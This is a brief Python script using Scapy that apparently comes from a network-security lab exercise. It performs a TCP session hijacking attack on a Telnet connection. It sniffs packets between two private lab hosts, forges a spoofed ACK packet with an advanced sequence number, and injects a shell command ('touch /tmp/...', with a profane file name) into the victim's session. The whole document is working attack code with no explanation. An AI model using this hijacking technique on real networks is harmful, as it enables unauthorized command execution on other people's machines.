#!/usr/bin/env python3
from scapy.all import *
def spoof (pkt):
    old_tcp=pkt[TCP]
    newseq= old_tcp.seq+8
    newack=old_tcp.ack
    ip=IP(src="10.9.0.6",dst="10.9.0.7")
    #ip=pkt[IP]  # cannot directly use will fail...
    tcp=TCP(sport=old_tcp.sport,dport=old_tcp.dport,flags="A",seq=newseq,ack=newack)
    data="\r touch /tmp/FuckYouAgain \r"
    pkt=ip/tcp/data
    ls(pkt)
    send(pkt,verbose=0)
    quit()

myFilter="tcp and src host 10.9.0.6 and dst host 10.9.0.7 and dst port 23"
sniff(iface="br-26d91dc2db22",filter=myFilter,prn=spoof)

